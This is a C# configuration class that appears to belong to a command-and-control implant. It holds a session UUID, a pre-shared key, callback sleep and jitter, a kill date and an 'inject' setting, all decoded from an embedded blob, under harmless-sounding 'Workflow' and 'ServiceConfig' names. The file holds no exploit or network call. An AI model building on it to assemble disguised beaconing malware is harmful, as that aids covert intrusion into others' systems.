using System.Text.Json;
using Workflow.Contracts;

namespace Workflow.Config
{
    public class ServiceConfig : IServiceConfig
    {
        public int chunk_size { get; set; } = 85000;
        public int inject { get; set; } = 2;
        public string? uuid
        {
            get
            {
                return _uuid;
            }
            set
            {
                _uuid = value;
                if (SetServiceConfigUpdated is not null)
                {
                    SetServiceConfigUpdated(this, new EventArgs());
                }
            }
        }
        private string? _uuid;
        public int sleep { get; set; } = 60;
        public int jitter { get; set; } = 10;
        private string? _psk;
        public string? psk
        {
            get
            {
                return _psk;
            }
            set
            {
                _psk = value;
                if (SetServiceConfigUpdated is not null)
                {
                    SetServiceConfigUpdated(this, new EventArgs());
                }
            }
        }
        public DateTime killDate { get; set; }
        public bool prettyOutput { get; set; }
        public bool debug { get; set; }

        public ServiceConfig()
        {
            prettyOutput = true;

            var opts = JsonSerializer.Deserialize(
                ServiceConfigData.Decode(),
                ServiceConfigOptionsJsonContext.Default.ServiceConfigOptions);

            uuid = opts.Uuid;
            psk = opts.Psk;
            sleep = opts.CallbackInterval;
            jitter = opts.CallbackJitter;

            DateTime parsedKillDate;
            if (DateTime.TryParse(opts.KillDate, out parsedKillDate))
            {
                killDate = parsedKillDate;
            }
            else
            {
                killDate = DateTime.Now.AddYears(1);
            }
        }

        public event EventHandler? SetServiceConfigUpdated;
    }
}
